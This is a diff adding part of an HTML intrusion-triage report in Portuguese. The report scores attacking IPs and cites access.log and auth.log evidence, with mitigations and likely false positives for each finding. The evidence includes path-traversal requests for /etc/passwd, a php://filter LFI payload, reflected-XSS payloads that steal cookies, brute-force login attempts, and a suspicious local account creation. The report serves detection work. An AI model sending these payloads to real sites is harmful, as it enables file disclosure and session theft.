+    <h3>5. IP <code>203.0.113.206</code></h3>
+    <span class="score band-médio">Risco 24/100 (médio)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 01:45:33 a 2024-01-01 01:45:43 · duração 10s · fases:
+tentativa</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+20</b> Gravidade alta: 1 regra(s) × 20 pontos (KALLYEL-WEB-003)</li>
+    <li><b>+4</b> Diversidade de técnicas: 2 técnicas ATT&amp;CK distintas (T1083, T1190): +4 por técnica além da primeira (máx. 20)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-high">alta</span> <code>KALLYEL-WEB-003</code> Possível path traversal ou inclusão de arquivo local (LFI)</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>3; de 2024-01-01 01:45:33 a 2024-01-01 01:45:43; fase: tentativa</dd>
+    <dt>Mapeamento</dt><dd>T1190, T1083, CWE-22, A01:2021</dd>
+    <dt>Motivo</dt><dd>Sequências &#39;../&#39; (inclusive codificadas) e referências a arquivos do sistema ou a wrappers de stream do PHP.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Páginas de documentação cujo caminho cita arquivos como /etc/passwd; clientes que enviam caminhos relativos sem normalizar.</dd>
+    <dt>Mitigação</dt><dd>Não montar caminhos de arquivo com entrada do usuário; lista de permissões; resolver e validar o caminho final; desabilitar wrappers PHP desnecessários.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (3 de 3)</summary>
+    <div><code>meus-logs\access.log:12659</code> <span class="muted">2024-01-01 01:45:33</span></div>
+    <pre>203.0.113.206 - - [01/Jan/2024:01:45:33 +0000] &#34;GET /download?file=../../../../etc/passwd HTTP/1.1&#34; 404 300 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:12669</code> <span class="muted">2024-01-01 01:45:38</span></div>
+    <pre>203.0.113.206 - - [01/Jan/2024:01:45:38 +0000] &#34;GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1&#34; 404 300 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:12678</code> <span class="muted">2024-01-01 01:45:43</span></div>
+    <pre>203.0.113.206 - - [01/Jan/2024:01:45:43 +0000] &#34;GET /page?inc=php://filter/convert.base64-encode/resource=index HTTP/1.1&#34; 200 300 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-6">
+  <div class="ip-head">
+    <h3>6. IP <code>203.0.113.204</code></h3>
+    <span class="score band-baixo">Risco 8/100 (baixo)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 01:15:55 a 2024-01-01 01:16:43 · duração 48s · fases:
+tentativa</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+8</b> Gravidade média: 1 regra(s) × 8 pontos (KALLYEL-WEB-008)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-008</code> Muitas respostas 401/403 do mesmo IP</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>25; de 2024-01-01 01:15:55 a 2024-01-01 01:16:43; fase: tentativa</dd>
+<dt>Critério</dt><dd>15 ou mais eventos em até 60s</dd>    <dt>Mapeamento</dt><dd>T1110, CWE-307, A07:2021</dd>
+    <dt>Motivo</dt><dd>Um mesmo IP recebeu 15 ou mais respostas 401 ou 403 em até 60 segundos: tentativa de adivinhar credenciais ou de acessar áreas restritas.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Aplicação cliente com token expirado repetindo requisições; scripts internos com credencial errada; NAT corporativo.</dd>
+    <dt>Mitigação</dt><dd>Limitar tentativas por IP e por conta; bloqueio temporário progressivo; autenticação multifator; alertar o dono da integração se for um cliente legítimo.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (5 de 25)</summary>
+    <div><code>meus-logs\access.log:9107</code> <span class="muted">2024-01-01 01:16:23</span></div>
+    <pre>203.0.113.204 - - [01/Jan/2024:01:16:23 +0000] &#34;POST /login HTTP/1.1&#34; 401 120 &#34;https://shop.example.test/login&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:9113</code> <span class="muted">2024-01-01 01:16:25</span></div>
+    <pre>203.0.113.204 - - [01/Jan/2024:01:16:25 +0000] &#34;POST /login HTTP/1.1&#34; 401 120 &#34;https://shop.example.test/login&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:9116</code> <span class="muted">2024-01-01 01:16:27</span></div>
+    <pre>203.0.113.204 - - [01/Jan/2024:01:16:27 +0000] &#34;POST /login HTTP/1.1&#34; 401 120 &#34;https://shop.example.test/login&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:9122</code> <span class="muted">2024-01-01 01:16:29</span></div>
+    <pre>203.0.113.204 - - [01/Jan/2024:01:16:29 +0000] &#34;POST /login HTTP/1.1&#34; 401 120 &#34;https://shop.example.test/login&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:9127</code> <span class="muted">2024-01-01 01:16:31</span></div>
+    <pre>203.0.113.204 - - [01/Jan/2024:01:16:31 +0000] &#34;POST /login HTTP/1.1&#34; 401 120 &#34;https://shop.example.test/login&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+</section>
+<section class="ip" id="ip-7">
+  <div class="ip-head">
+    <h3>7. IP <code>203.0.113.205</code></h3>
+    <span class="score band-baixo">Risco 8/100 (baixo)</span>
+  </div>
+  <p class="muted">Período 2024-01-01 01:30:44 a 2024-01-01 01:30:54 · duração 10s · fases:
+tentativa</p>
+  <strong>Como a pontuação foi calculada</strong>
+  <ul class="comp">
+    <li><b>+8</b> Gravidade média: 1 regra(s) × 8 pontos (KALLYEL-WEB-002)</li>
+  </ul>
+
+  <div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-WEB-002</code> Possível XSS refletido na requisição</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>3; de 2024-01-01 01:30:44 a 2024-01-01 01:30:54; fase: tentativa</dd>
+    <dt>Mapeamento</dt><dd>T1190, CWE-79, A03:2021</dd>
+    <dt>Motivo</dt><dd>Marcações HTML e manipuladores de evento enviados na URL, típicos de tentativas de XSS refletido.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Sites de documentação ou fóruns técnicos em que o parâmetro carrega código; links de redirecionamento com &#39;javascript:&#39; legítimo (raro).</dd>
+    <dt>Mitigação</dt><dd>Escapar a saída conforme o contexto; Content-Security-Policy; validar entrada; cookies com HttpOnly.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (3 de 3)</summary>
+    <div><code>meus-logs\access.log:10872</code> <span class="muted">2024-01-01 01:30:44</span></div>
+    <pre>203.0.113.205 - - [01/Jan/2024:01:30:44 +0000] &#34;GET /search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1&#34; 200 4000 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:10885</code> <span class="muted">2024-01-01 01:30:49</span></div>
+    <pre>203.0.113.205 - - [01/Jan/2024:01:30:49 +0000] &#34;GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1&#34; 200 4000 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+    <div><code>meus-logs\access.log:10896</code> <span class="muted">2024-01-01 01:30:54</span></div>
+    <pre>203.0.113.205 - - [01/Jan/2024:01:30:54 +0000] &#34;GET /redirect?u=javascript:alert(1) HTTP/1.1&#34; 200 4000 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36&#34;</pre>
+  </details>
+</div>
+
+</section>
+
+<h2>Achados sem IP associado</h2>
+<section class="ip">
+<div class="finding">
+  <div class="ip-head">
+    <h3><span class="badge sev-medium">média</span> <code>KALLYEL-AUTH-003</code> Novo usuário local ou uso incomum de sudo</h3>
+  </div>
+  <dl>
+    <dt>Ocorrências</dt><dd>2; de 2024-01-01 01:02:46 a 2024-01-01 01:02:56; fase: ação</dd>
+    <dt>Mapeamento</dt><dd>T1136.001, T1548.003, CWE-269</dd>
+    <dt>Motivo</dt><dd>Criação de conta local, ou comando sudo que abre um shell, altera contas ou edita sudoers. É uma heurística por lista de comandos, não por comparação com o comportamento habitual do administrador.</dd>
+    <dt>Falsos positivos prováveis</dt><dd>Administradores que usam &#39;sudo -i&#39; ou &#39;sudo bash&#39; no dia a dia; criação planejada de contas.</dd>
+    <dt>Mitigação</dt><dd>Confirmar com o administrador se a ação era esperada; restringir sudo a comandos específicos; auditar contas novas; registrar comandos com auditd.</dd>
+  </dl>
+  <details>
+    <summary>Evidências (2 de 2)</summary>
+    <div><code>meus-logs\auth.log:811</code> <span class="muted">2024-01-01 01:02:46</span></div>
+    <pre>/bin/bash</pre>
+    <div><code>meus-logs\auth.log:813</code> <span class="muted">2024-01-01 01:02:56</span></div>
+    <pre>new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash, from=/dev/pts/0</pre>
+  </details>
+</div>
+</section>
+
+
+
+<footer>Relatório de arquivo único, sem scripts nem recursos externos. Triagem, não veredito.</footer>
+</main>
+</body>
+</html>
